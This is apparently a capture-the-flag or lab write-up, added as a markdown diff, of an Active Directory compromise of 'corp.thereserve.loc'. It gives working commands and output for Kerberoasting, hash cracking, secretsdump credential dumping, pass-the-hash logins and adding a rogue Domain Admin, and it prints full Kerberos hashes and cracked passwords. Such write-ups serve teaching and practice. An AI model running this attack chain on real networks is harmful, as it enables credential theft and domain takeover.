@@ -1,0 +1,183 @@
+# Kerberoasting & Credential Extraction
+
+run **`GetUserSPNs.py`** via `proxychains` against `corp.thereserve.loc` as `laura.wood` and successfully harvested SPNs and their Kerberos TGS hashes (e.g. `svcBackups`, `svcEDR`, `svcMonitor`, `svcScanning`, `svcOctober`),
+
+![image.png](image.png)
+
+```jsx
+proxychains /root/Rooms/CVE2022-26923/certipy/lib/python3.9/site-packages/impacket-0.10.1.dev1-py3.9.egg/EGG-INFO/scripts/GetUserSPNs.py corp.thereserve.loc/laura.wood:"Password1@" -dc-ip 10.200.118.102 -request
+```
+
+![image.png](image%201.png)
+
+```bash
+root@ip-10-10-200-27:~/BloodHound.py# proxychains /root/Rooms/CVE2022-26923/certipy/lib/python3.9/site-packages/impacket-0.10.1.dev1-py3.9.egg/EGG-INFO/scripts/GetUserSPNs.py corp.thereserve.loc/laura.wood:"Password1@" -dc-ip 10.200.118.102 -request 
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:9050-<><>-10.200.118.102:389-<><>-OK
+ServicePrincipalName  Name         MemberOf                                                   PasswordLastSet             LastLogon                   Delegation 
+--------------------  -----------  ---------------------------------------------------------  --------------------------  --------------------------  ----------
+cifs/svcBackups       svcBackups   CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc         2023-02-15 09:05:59.787089  2023-02-15 09:42:19.327102             
+http/svcEDR           svcEDR       CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc         2023-02-15 09:06:21.150738  <never>                                
+http/svcMonitor       svcMonitor   CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc         2023-02-15 09:06:43.306959  <never>                                
+cifs/scvScanning      svcScanning  CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc         2023-02-15 09:07:06.603818  2025-10-19 06:39:34.605803             
+mssql/svcOctober      svcOctober   CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc  2023-02-15 09:07:45.563346  2023-03-30 23:26:54.115866             
+
+[-] CCache file is not found. Skipping...
+|S-chain|-<>-127.0.0.1:9050-<><>-10.200.118.102:88-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-10.200.118.102:88-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-10.200.118.102:88-<><>-OK
+$krb5tgs$23$*svcBackups$CORP.THERESERVE.LOC$corp.thereserve.loc/svcBackups*$7dcff8ff494f0fc997fd085c7a632e22$66c50c1b12890d08f1e5ed6aa841e2161150509b5ca20c3a8a30416bfe09221ac2db0b2f1e660606624431d622d046dfb3ea7940bacc7c2b98b4195672e3fe5fdb5fc1110961c2c63c5917631dd1d99fb40b406f5731ca530424ce7eac952d4bd07740a7085d91644205d3e64335bb3ba2c688ceb63bbf126a54d1eab61115987409962d1869567aabe76175f219b622e98b8efafd9622d200408077450a477e0acd5d6615009490e5f2c43bfe5c742faa9f905adc46aeaeadb1149b1c8fb8fcd0cfc7fa5055fa405b3634796ded60c10357e73c1177f757932ffacba044567f81c94aabcd543ecf4a858759f7b6f5a187b55666ae3e4f7213cbf3e026158d7f7f3094cad5e09a6b2ad26486bef315218a6c183541db8332c50ce32b246250694e4f2d86adfa5a39fa8a3f57d12e89ed5d3923d3f0f89a8515021ca7a4608028d35f6590aaa692ce456bcb1477274ec89a88cf84c5fbe41ac0e83c42e639eb917f64422615ae21bd887f98658706445a4835f10a7f4e50b65c1ae54d5a9a7ee7543c210e21bc1971db903e3b06796e741237a3552c09015809a6d88ef7874f62924d8229b9951938037ec8344790d0c1224bd510a28df032940e068ddde075975a8e5540f5186f901de1712fc9f8b90e9204727dcc66dccc889329d76c8e0dc758ae06242fe8bdd54c5c36a660057b786e01c5f4daaaa08c7d3c454c823dcd618f3d64e7db34dfcdbb9f802b4495c70cf73d10f9963d2066b4222d640158ef1cb566b6e0ed087f71e4541b45363395f04d2c18848b8a40fdd238b1f2c552130e1fdeced7b59c4302647ced78bcb25d3706817ffff4c5b55cc96e27b87652230261872c7ce08fcc96e31021e3af5144d79a5450ce5b5720f3f4ed0c55979aa8d29ee8001d17abb9901620f6e3875e80e93d83153fe93d315324b1fa71849cf14a19426e874984cdb914e0c7afa97e49dc4b6da7aa6f77ab7b72c6250f43c0805f613ff37e499e8f61bf243bbebc513113ecfde645cd060ca23d6133e08dd6032ff6ddc10afdb91cb57d118e12fad86db59945bfd5dbb89d4164177cc022edb16141fe3ee99b519247756bbcf42f16e85cc32a28b418fbdfafc1bd4b6a183263d6ba8362bf8e44cd214c437e7a51c0012def1038711892f48faf50f8bbc49ae72f68ecd79eaa9de7b17ac8814b9010a1ebecb7e2244f363504817a07adcaaf579af31104ef8d792383f8ccb0c0963c3f5b7675b18eb92ef642a0d8f76c54e17af383997fceb033cd0051da6ad89ff37ff6581e086b6fff996a801044c5784afb624428576d0a31ab23c2810f4e5804df8c7f2c37590881951e4e55d867977a319da0a45920be6203d880c544d0b3ac93745ce002f5f57884f60e2752e4ed5c69616fa64ddffa324069bba31baaecb34f0e53f6d19f073d8ba97aa441076c63c96483489c388afa8c770b39aa3167e4af2a1fdcb9e4133cb616d6c489af5e414c80ae781a8ffba8385258063f0e7bf5cb1a0fc74752692c3c4ce6ef52306fd6e5ce6730e0799530
+|S-chain|-<>-127.0.0.1:9050-<><>-10.200.118.102:88-<><>-OK
+$krb5tgs$23$*svcEDR$CORP.THERESERVE.LOC$corp.thereserve.loc/svcEDR*$10be7419ffda03065efc31d7928791b4$f676292f585b0ded536d622ff2dea5d32e0fac8a7715dfb0e87103cc670c2fd4bcc899468ef5732b40c23fe7717b7804e448f7460c1875fb1caa40cfbb5f069d5f30ad8e362578dfd635f4cf12ea9af1eecdf58c353bee563905bb841196eeae12f33dfaa65190e6ee1b4c7561617fe47daf4a3943f1b20129f9df75f3d3b7677ff650046453301e9a113f5c8afb0ba6d1aba967bef538c06cddb9cc69d45f9232e93ef90a2fa43ca1eb34a482dad001f9c5e83f97271d617a306eef8b3172e92e71ad5c925391086ac962373a7f9eb056129f854f2416538773a5acd8b1ec52d9186b11b8aa90ed4715e349b350bc99bb4a9f8ca6f9f2315673cfd009cc3612c2e12d71d2269b46e58e5deaaaafebec2453c6f0549ffe5ad39e1e3f2aeaaf230f2de362335d9648a6b1ba8930622046809cfe4497453e4db03b08be554d9f0806252fb2bee5e965338126aae633afbc995073a2b41a4ab63393c95b2bdcfbd06da0df1a0e28c3226064f92207cb07063fc7ee73d6107a52dab2b566bdfbd4f4abf53128502d31786b6de8cb3f23688ea76b0b9547987ee44636ece9084a5d5c5ace4c8fb148a4364c0816aa735533aa5f62e57f4dff43abcb6577a923da1103709abaf20493d56678d30b9204412425eaeef185e87d5547767850a8f514de7a48502d883ce56f21a49ffcf8814e0c2b574de14c1a78857d157b99d435a2356e0ed0122ad6cc8c3a039025c294b188f3638995c792754ad32b63e2733a945dfb10daec37cef31ddbe67f504f96612d1013f5ff893fb5503d2806f66d01b03b2f5fede9e5753118ea86252facba91b8c8c1686724259ac0786a2f02d6c1491063f4fe8d818d431e66812255292cca8c03e64acad4c32971fec720bcfcc728c60d97622cb9cc910c5d6897c6868e9d60bcb179cf3ac5d2760672ae7414555a293870b432d23b793000fb675edfe10a7ce4c4064f52ce8b86363b72173a4d20f223ac5b131c3f6e3576bfa6e4cc105136e7dd775a15c08884b88e01a35cc30633f7251e66dee9670c4993d730323a249b41fa9c18136330631d9f44811d80e572f4503ff3daec9e9f53e76a20022208a73564a05c1ba0caccab5a35d879f0daa38125e0b56c76c113f545ecc0e6152f857aee374de294984a97a58202b1b9d9e15deb96c034c0982d4a8eae75d036c6263ae6a6c50620e7f9dd9107b24a290f35bd96669caeb0ac5d8b79dac1d269b019317fb38167809c6546cfd8dd43d850bfb5a98280fa21e6dbe3a1db7cc1be7338a24ce0ac858c48ad2f086cd5df04d8880b09d3332de79818d2370d351d3239233d118c7fa692c5929ae60e3530965e5c97824874a53e1f2f74d88fff122a04d3c61e6da7e9d6e9328ab07192a1f3edb298472414d4728538303790efbc225b3932ec2381bd3a5d8db2d7144861037d575a2b21ab84140a275b9141169de63987d44840894f9068156ed2e4596ffabe51a6dab5f2685c7effc52fe7a8dd9df782299fa39379441940ff8f9b6a3a6ee0b4fbac208b2a25c5
+|S-chain|-<>-127.0.0.1:9050-<><>-10.200.118.102:88-<><>-OK
+$krb5tgs$23$*svcMonitor$CORP.THERESERVE.LOC$corp.thereserve.loc/svcMonitor*$d986a757b1d0d577da555aa8b5212170$a24508810933997487c32887021be1be0766dced3bfd8b265171684f954315b0c8942b79217458ff15f535a8e378788983ba370415e18a157f9a6fd42b1dcbbd47bcd88150ec39ef1d5c7e3f8a770ec3b9c347be1e5bcadc97298448313229f7b6c773d8e29c5426f65746965f91e9ffbea098220e068e39886bc1f8c9691988013d210ccb20d35fa43ac83c2feae1fa60493cced6459284aed9fbf385739480d57db023d0ee0776c1b8ecd99d0de43119628efd110522262c99e3f86ed20a69c9d8e45c31dd5221cd026d55b61ac4cbbaf60dfab267e55583aa82f4657d0c969e12f1ebcb95153cb70f8993490c59b5cf9155c0f8d36f6c1c5459e298309780b2c1169f0bc7fe1a78fc3fe361fce983ffe0c3cad15c44c74b0f5b72f4cedd994e453023d621dc0eb43791e7e1ead190c5930665b1db921008bacf7cbef400691d3ee93053b0affb0807c0565cfd037b1cc288858dd3ecb852ca0242a9d036ae231fc37235aacffc4ef9a3f18b3d76957e02fa73e08a247e2ddb786f2a442b7bf8ce25c7b54deca9328ceaf6749eb01bd7f13ee0bc1ea5a24449fe4c76e0be5b34a3eb2671add0285af1d73842345ad3c8aa2ed3da1d9daf22a7e437adb7376e5befdecd29210649321e696486c434ea70b3705a5e115382f14b0a62fb13f57a16bc90898e11aaae0cc5193a91dcfab8255a0a84a4e36c2bea8d6d91fdf0c7270dfa16ec7f3063726646b70856f0cab04056616d03ef4b2db65fcef09c4960cb8a8978ff781e851d042d788d1841451378942f657c4ecb0d4266112aa4f0dec04f2249e7be8e49fef83a158d4d363c5be8552ef39331c5ac99de648f3bef6dc3b84985e1ceb9e0241c7fa66d455ba6ea43b9dfeaea0271d9cdd16b15c020945aa323c554440b40d87bd4de1d7603d65028af9eed2fd7fc8453a77d60cfa5d7da54cce64e1ece3a3c559de8d06e72f0bfa1f6ea7be6a59fe400ddc619276e3a1c1637480c1f3f82cfc15181fdd93ad7e10c5577d6fc04f468e5c29a43388676cabc1cae190e47b3708c9c2db5a4fd5a1b91bcbb5c9466d5e1444eff91c6179503d042e1b6004dcc4e80e43f01161c7477026ea9112b62edd168eb46b9c9f943fef65fd4fe84e3769457183e975c70ee79d9417c256aaf9c2a722e87cfa72a5feed8719bc56ea196212c0a30db4b25a26e106753d45430bf5bbccf238d67c8329beabdf4fdcaeda81d734946416999d74b0e50c113dc1e85a3ab80085ce509dc3670241fd8520ea7c37ba3151cd8e7b95cb661eb322bc20485008e5a03684cebcd16f16830b37dd2cecbb5679410339aab4ea8c8f5ef3e48fc76d5ab315861c7e2fcd80203495e991ffa1eecc6f07a931d373f8cd3dbe7b14da529838c4d5e88a389b6dc18816afb3e47b2be5df587b78fa51b841bec5f70e6d18f4f44d569748dae1d4f88d7e24f349df11820596fc2d51eaa9eb80bc91d0c06b06d74f4ee6d0f4da367e7cac9e5ed9b29b9db9671db09d00ea8204de37da6aff25b847aca3dd1183acf8604af
+|S-chain|-<>-127.0.0.1:9050-<><>-10.200.118.102:88-<><>-OK
+$krb5tgs$23$*svcScanning$CORP.THERESERVE.LOC$corp.thereserve.loc/svcScanning*$cd700135b30970c415f47dd137f3bf4a$b6f3ce188c8ae06535ba71f7cedbf6e95cfd16cdbc494f209a9d7a8ee838280790e7ea6c717c76ebe4f524e2ef423883c470483dc79da93f34c9e7591bb8a40f390d06607281d854955f469f35916c18e3ff1541041f4178f29e6c569d3a4692d51c33d60b71b2adc7bbc4a1c53db7d973aeac8499beeadb6e1c96463b186b71ba599076de10984a1ef05b8448eeb96e474658c1d6da7b1b06f7718acc5730894a2f0fbacb97b243d6ef053c0667f15592bbd946090d0bb6b6163bbba856046f142ed3e7db089d67a81b30e8bf7c623574cc1c86dd65197ee0d1486a2f64c7a6922c1d1f12e14bc1bbe628d209d68e7a80f8eaae0129f2c4260dc26a3a85eb1b31275280890ef4ad6ec63fe0d0107d76810cad572ceecdebff125e49f4ffacf07a193ecbdb062225d390a2029143aff817b9acc7a656e42b8eefcd976b605fe89ee0e7a34962d60c7b6079b29d053ea873b728986bce27b0ff9f7816212a7f917c79cf379604b73182f5377b47704b892a1e3e4ff1f9f8438ef3850ec7cfa968d995788a7b52f76bd92a806463e4786f17a610714378ea52a023a2e24bda690ff564202a4c17a8997d159c81acae9cfb4ad7348ac2b1259ff5b375506a95d60b483b132b4bbfd66872b33bbb97e20fcf7882b86d0365ef1beb029eaaf823e98b9504da56c33ed185389e17f1be6e10e22be5e086999bc5c03a592bbd62ae0abe56b872752f3ae6399465951f977d23775293e327302c23bd5cc1754cad2c208570f0fc10ccb24b9234cb200effdc2d43a0dd78365430a0ee415fc155813aa089579776f2cf368a0f6a06a34be7cfdf8e5ae2cfc96a13c61e3b40559c323b9752dea11d48a11c07edb5a3c631f27dc2b86a74c86a8cbcf61a9c6b59b7ca46b32ea388587febfb7c4f0af2c660d3b3ba1862f6853e0801a8c6c607c1fadfd74c0cefdca66c31cbc96bb0a625fde9726b2a359b78a8e07819419e184fef9d6ad596dd5dbae15ace42f9330a63d042961a83640e09a55b12eda575d897274649fbef865216856e448e2c3100672f6f91a98ad0357b595531e58cdbe76e47dc632feee707b845fd414d52fe42d1acdd19ac142310f6dd5bd2b844541674579d99d3dade734f601ad37c4ed3f2f3bdb0cf6eb48ddb5032954176f559984007f99fb4159e223bb71c8746cb58e741a3db2cdf8db42b0e09b961517b80129a5edc5dc7dc5b934e459581a48f74a1d820c383e48caeca51620f80014048e2373bab110b4264d75574e9db9592ffcbbf75789cf763f82950172e723b448a220fe4d8c478643657cf0bdad085a41dee9977f290e04058bfb7af6d638531a4c9ac4037ef1381aca99aa5ed5630347a156b70a7da927ab3546fd0859f6d7b3f37571f62e0d77b7e99d3a4b51bb317b868c334bf8da1dfccc68498656500e3e458b39b68bff89f10d54eb040bcc5746e82c35808b3686971c6d04630aefa5df74f10432521f93b603698ba997a4513b2c85f165ca07939cdd42a441c7b277ea9654f417b523327619f4986a8b8
+|S-chain|-<>-127.0.0.1:9050-<><>-10.200.118.102:88-<><>-OK
+$krb5tgs$23$*svcOctober$CORP.THERESERVE.LOC$corp.thereserve.loc/svcOctober*$7564cbe3f736a4c20376b23354a03f48$6af23a7fda33c79d4e8a5070d15922d1e22fb3bb1925dfd79593564e4dfbc95d61b09e45829762bc8cca419c4f6e183bc1f4143ae0aef478e8a2461864a83a280bb5646c838510dcf3193718b6b64dfbc3a9ee2c69ce620bb7b5ddf927514d7814b30f95b484bf3f7409ba0195c98b592b45a59806c9695d88ef4652f5464cdcaca2b85820558d1929034249250099de74b3a1a2491beecadd4eb634dd417da4dd8148b47eb529be8ec9a2a2d7b89bb6be1630de189ec01ffec96b1cd6956420e7a2d6b4b16d53ed3e2b01b19bb7695664a5644bfe3ca6e4d662fd00d0d6afe5da7a9eabe46af99e892a3c3c876e8805fd6afed47a1a1ecfad920772e198fe9da49a163a66032c401cc9cc26dde754d5302ac95378458e86db8f2c60626f5923ccc6af1c8d0c494de3937c3034a5ee663f6511f9f6bbfb0e8bcfdfd1fc26b0d465e46ef6c4fb552fe786a6aaabfd343ac62bb00f50502de2682d0fb32e038227d5b92e7e96cceb916a904a3dc3dc4f6c28e30c265a2f6836570a1ab32c9e28c525d4b6f71d55d44ce40beafa7fe26c42b04d21d6dcf99532b8b58e621a8ca24009c66a07359e14159f5f10e4ad2ca3f2c7ece28d98671d1e24f227db3c199fd9e358b62948ea11d595603fb60cf29c22de30b1d513a6a38fcb49c7885df5bc047e35ae8c2781eb6d95af8d586e32145cdc94b56604b9d66999d74426c42db10bfec9d810fe352d72e15bc19aadcd52383a6da7b863da3b33003c934e715f266dc4a82fe25106225a10ab645813f690f3a2f4817cb90c5ffc8215e2ef7535311e0d031a16f018797258f303ea5c21867f07257224e28e801f6949372053b407e02816102979864c5b3c82f0822898bec255cbc00bb02a2ed725b4bd7f70de81abb1684a2647d8a1eb2c4023953dd0bd4edda2c40f25df8a588795b467aa7ea7c9be8c1342105804d3e56fe1123020e5966d97e5cca58ee371506f11002b33ca64f25f9ed67a43bf697e6f07df74daa279af1d857c2d3cd9f9e777d06423f8219ac2419b3a53c87c59142279e67f256a306f4f43e1ff9caf60e43d923f458087c42468008f84a0db7b0a4579b7ebc845ba2943d40a0dd1d39405c7e486244cdefa744ab17e8bcd64b35cbe01c65484b49e3a64658759b319ddfcee5224381f86a9ce52188f8bf5a99f162a0267e7742a7fce156f94b13b833043f2911233f2ea71a75d6993636a28b6dc953878689975e5a3898b892f32f60d40bdb5844bca0d52672a573535e087cad46f4ad4cc1eaf5b25d689d290b4fdc9c9de8201cd85453a0065c566ffdd07a8ed153e82cdfa275294b1b8f63775b2d71f60f5ab31e83b405acfd472beec61f363a5bd3154fd9f311dc2eaa47eb443beb251d93047aafd520203fcafce26e9267befd5a97e532b8ebb876b984be4110f46e68f9927ec857f3532c34f9a36cac8da310fda601de7883be8aef6cd4be5103c6ef794ed0ef6f9e5a4ca2aabd7a8e50d2be97b7427d0cf79b166c765a17275cde4b1f00258446dd724a27c1809
+
+```
+
+save the   hash and try to crack then  
+
+```jsx
+hashcat -a 0 -m13100 hash1 /usr/share/wordlists/rockyou.txt -O
+```
+
+`svcScanning:Password1!`
+
+![image.png](image%202.png)
+
+```jsx
+proxychains python3 bloodhound.py -d corp.thereserve.loc -u svcScanning -p "Password1!" -c all -ns 10.200.118.102 --dns-tcp
+```
+
+![image.png](image%203.png)
+
+![image.png](image%204.png)
+
+---
+
+Runs **`evil-winrm`** through the SOCKS proxy (`proxychains`) to connect to Windows host `10.200.118.31` as `svcScanning` with password `Password1!`, opening an interactive WinRM session.
+
+```jsx
+proxychains evil-winrm -u svcScanning -p "Password1!" -i 10.200.118.31
+```
+
+![image.png](image%205.png)
+
+```jsx
+proxychains remmina 
+```
+
+![image.png](image%206.png)
+
+back to e-citizen
+
+![image.png](image%207.png)
+
+![image.png](image%208.png)
+
+select 5
+
+![image.png](image%209.png)
+
+![image.png](image%2010.png)
+
+![image.png](image%2011.png)
+
+![image.png](image%2012.png)
+
+finally receive flags
+
+![image.png](image%2013.png)
+
+---
+
+---
+
+run  **impacket‑secretsdump** through a SOCKS proxy (proxychains) using the `svcScanning` account on `10.200.118.31` to dump **SAM hashes, LSA secrets, cached credentials**, or perform DCSync if the account has privileges. It’s used to gather credentials for lateral movement or cracking.
+
+```jsx
+ proxychains impacket-secretsdump corp.thereserve.loc/svcScanning:"Password1!"@10.200.118.31
+
+```
+
+![image.png](image%2014.png)
+
+![image.png](image%2015.png)
+
+**`svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G`**
+
+Domain Hash credentials
+
+```jsx
+proxychains impacket-secretsdump corp.thereserve.loc/svcBackups:"q9nzssaFtGHdqUV3Qv6G"@10.200.118.102
+
+```
+
+![image.png](image%2016.png)
+
+**`Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e:::`**
+
+then use evil-winrm to get an interactive remote Windows shell
+
+```jsx
+proxychains evil-winrm -u Administrator -H d3d4edcc015856e386074795aea86b3e -i 10.200.118.102 
+```
+
+![image.png](image%2017.png)
+
+back to e-citizen and select 7 
+
+![image.png](image%2018.png)
+
+![image.png](image%2019.png)
+
+```jsx
+proxychains xfreerdp /u:Administrator /d:corp.thereserve.loc /pth:d3d4edcc015856e386074795aea86b3e /v:10.200.118.102
+
+```
+
+![image.png](image%2020.png)
+
+try to add user
+
+```jsx
+rm gteamdepi.txt
+New-ADUser Mariam
+net user Mariam 
+net user Administrator /domain
+Add-ADGroupMember -Identity 'Domain Admins' -Members Mariam
+Set-ADAccountPassword -Identity Mariam -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Str0ngP@ssw0rd!" -Force)
+```
+
+![image.png](image%2021.png)
+
+![image.png](image%2022.png)
+
+![image.png](image%2023.png)
+
+**`Mariam:Str0ngP@ssw0rd!`**
+
+active the account
+
+```jsx
+Enable-ADAccount -Identity Mariam 
+```
+
+use remmina to complete getting flags
+
+![image.png](image%2024.png)
+
+![image.png](image%2025.png)
+
+finally got flags
+
+![image.png](image%2026.png)
+
+---
+
+---
